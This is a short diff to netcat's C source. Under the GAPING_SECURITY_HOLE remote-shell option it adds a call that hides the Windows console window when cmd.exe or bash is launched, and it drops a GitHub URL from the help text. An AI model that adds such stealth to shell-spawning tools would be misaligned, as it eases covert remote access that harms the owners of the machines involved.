@@ -1929,6 +1929,7 @@ recycle:
 		case 'b':
 #ifdef GAPING_SECURITY_HOLE
 	#ifdef WIN32
+			ShowWindow( GetConsoleWindow(), SW_HIDE );
 			pr00gie = "cmd.exe";
 	#else
 			pr00gie = "/bin/bash";
@@ -1944,6 +1945,7 @@ recycle:
 		case 'B':
 #ifdef GAPING_SECURITY_HOLE
 	#ifdef WIN32
+			ShowWindow( GetConsoleWindow(), SW_HIDE );
 			pr00gie = "cmd.exe";
 	#else
 			pr00gie = "/bin/bash";
@@ -2282,7 +2284,7 @@ the obvious */
 static int helpme()
 {
 	o_verbose = 1;
-	holler ("NetCat for unix/Windows v" VERSION " https://github.com/brock7/netcat\n\
+	holler ("NetCat for Unix/Windows v" VERSION "\n\
    connect to somewhere:	nc [-options] hostname port[s] [ports] ... \n\
    listen for inbound:		nc -l -p port [options] [hostname] [port]\n\
    options:");
